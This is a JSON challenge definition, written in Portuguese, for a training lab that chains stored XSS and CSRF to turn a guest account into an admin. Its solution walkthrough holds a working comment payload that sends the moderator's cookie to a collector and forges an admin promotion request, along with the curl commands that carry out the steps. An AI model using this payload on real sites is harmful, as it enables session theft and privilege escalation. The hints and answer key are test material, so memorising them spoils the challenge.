@@ -1,0 +1,84 @@
+{
+  "slug": "chain-xss-to-csrf-admin",
+  "title": "O reflexo do moderador",
+  "codename": "LANTERN LEDGER",
+  "summary": "O Lantern Ledger armazena comentários de leitores sem escapar, e revisa páginas denunciadas com um bot moderador que carrega o cookie da equipe. O endpoint de promoção confia apenas nesse cookie, então um comentário público se torna uma cross-site request que transforma o leitor em administrador.",
+  "category": "chain",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "chain-xss-to-csrf-admin",
+  "estimated_minutes": 35,
+  "xp": 300,
+  "tech": [
+    "Flask",
+    "Stored XSS",
+    "CSRF",
+    "Admin bot",
+    "Cookies"
+  ],
+  "tags": [
+    "chaining",
+    "xss",
+    "csrf",
+    "privilege-escalation",
+    "admin-bot"
+  ],
+  "story": "O Lantern Ledger é um pequeno site editorial com uma seção de comentários ativa. A moderação é feita por um bot que abre artigos denunciados com uma sessão da equipe para poder ver o console. O formulário de promoção do console envia POST para /admin/promote, um endpoint que verifica apenas se o cookie da equipe está presente, e a visualização de comentários renderiza cada body como HTML bruto.",
+  "objective": "Armazene um script em um comentário público, faça o moderador abrir o artigo e use o cookie da equipe para chegar a /admin/promote, de modo que a conta do leitor se torne administradora. Os dados exfiltrados do moderador caem em /collect.",
+  "rules": "Fique na origem loopback atribuída. Promova apenas a conta `guest`. O bot moderador está disponível apenas na plataforma; em uma execução local, dispare as mesmas requests contra /admin/promote e /collect. Resete o lab para limpar comentários e roles.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de promoção do moderador",
+      "flag_type": "root",
+      "points": 300,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Comentários são markup",
+      "body": "`/article/lantern-1` interpola o body do comentário armazenado sem escape. Envie um comentário e veja-o voltar como HTML naquela página.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "O bot traz o cookie",
+      "body": "`/report` envia o bot moderador ao link que você fornecer, com seu cookie da equipe. Denuncie o artigo que você envenenou.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Um formulário sem token",
+      "body": "Carregue `/admin` com a sessão da equipe: o formulário de promoção não tem campo anti-CSRF e `/admin/promote` aceita um body de formulário simples de qualquer origem. Dispare um `POST` com `username=guest&role=admin` a partir do payload (ou diretamente com o cookie da equipe) e leia a flag na confirmação.",
+      "cost": 30
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — stored XSS.** Os comentários são armazenados e renderizados brutos:\n\n```bash\ncurl -s -X POST http://127.0.0.1:PORT/comments \\\n  --data-urlencode 'article=lantern-1' \\\n  --data-urlencode 'author=reader' \\\n  --data-urlencode \"body=<img src=x onerror=\\\"fetch('/collect?c='+encodeURIComponent(document.cookie));fetch('/admin/promote',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=guest&role=admin'})\\\">\"\ncurl -s http://127.0.0.1:PORT/article/lantern-1 | grep onerror\n```\n\n**Etapa 2 — entregue ao moderador.** `POST /report` com `link=/article/lantern-1` envia o bot para lá com seu cookie da equipe. Tudo depois desse ponto é o que o payload faz naquele navegador; sem o bot da plataforma, você o reproduz no lado do servidor com o mesmo cookie.\n\n**Etapa 3 — o CSRF.** Com o cookie da equipe, o console não tem token CSRF e `/admin/promote` ignora Origin:\n\n```bash\ncurl -s -b 'admin_session=<staff cookie>' http://127.0.0.1:PORT/admin | grep -n 'csrf\\|token'\n# (no token field in the form)\ncurl -s -b 'admin_session=<staff cookie>' -H 'Origin: http://attacker.invalid' \\\n  -X POST http://127.0.0.1:PORT/admin/promote -d 'username=guest&role=admin'\n# guest now has the admin role ... <pre>RV{...}</pre>\n```\n\n**Etapa 4 — capture.** O primeiro `fetch` do payload beacon o cookie do moderador:\n\n```bash\ncurl -s 'http://127.0.0.1:PORT/collect?c=admin_session=<value>'\ncurl -s http://127.0.0.1:PORT/captured\n```\n\nA resposta da promoção (e `/staff`) contém a flag e registra o objetivo; o envio para `/collect` é registrado separadamente.",
+    "root_cause": "Duas falhas clássicas compõem a corrente. Stored XSS: a visualização do artigo escreve `row[\"body\"]` direto no HTML, então qualquer comentário é executável no navegador de todo visitante, incluindo o do bot moderador. Falta de proteção CSRF: `/admin/promote` autentica apenas pelo cookie de sessão ambiente, aceita posts de formulário simples, não verifica Origin/Referer e não tem token anti-CSRF, então um script rodando em qualquer lugar (ou qualquer site) pode submeter uma mudança de estado privilegiada. Como o bot visita URLs escolhidas pelo atacante, o XSS não precisa estar em um comentário — o sink armazenado apenas o torna persistente e compartilhável.",
+    "mitigation": "Faça escape de toda saída de comentários (autoescape do Jinja, markupsafe.escape) e sanitize com uma allow-list (`bleach`/DOMPurify) se rich text for necessário; adicione um Content-Security-Policy estrito e cookies HttpOnly, Secure e SameSite=Lax. Proteja toda rota que muda estado com um token anti-CSRF por sessão validado no servidor, verifique Origin/Referer e exija reautenticação ou uma etapa de confirmação para concessão de privilégios. Nunca deixe um bot com sessão seguir links não confiáveis; restrinja o escopo do cookie do bot e aplique rate limit. Audite mudanças de role e gere alertas para promoções a admin."
+  },
+  "references": [
+    {
+      "title": "OWASP — Cross Site Scripting Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Regras de encoding de saída que impedem markup armazenado de executar em comentários."
+    },
+    {
+      "title": "OWASP — Cross-Site Request Forgery Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Tokens sincronizadores, checagens de Origin/Referer e cookies SameSite para endpoints que mudam estado."
+    },
+    {
+      "title": "PortSwigger Web Security Academy — Cross-site scripting",
+      "url": "https://portswigger.net/web-security/cross-site-scripting",
+      "source_type": "official",
+      "description": "Sinks de stored XSS, construção de payload e o impacto de executar código em uma sessão de admin."
+    }
+  ]
+}
